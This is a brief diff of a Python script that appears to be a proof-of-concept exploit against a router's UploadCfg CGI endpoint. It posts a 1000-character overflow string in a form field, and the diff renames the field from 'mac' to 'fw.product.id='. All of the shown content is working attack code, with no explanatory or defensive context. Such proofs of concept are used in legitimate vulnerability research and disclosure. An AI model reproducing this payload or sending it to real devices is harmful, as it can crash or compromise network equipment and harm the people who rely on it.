@@ -25,7 +25,7 @@ import requests
 ip = '192.168.0.1'
 url = f'http://{ip}/cgi-bin/UploadCfg'
 payload = {
-    "mac": 'a' * 1000
+    "fw.product.id=": 'a' * 1000
 }
 
 res = requests.post(url=url, data=payload)
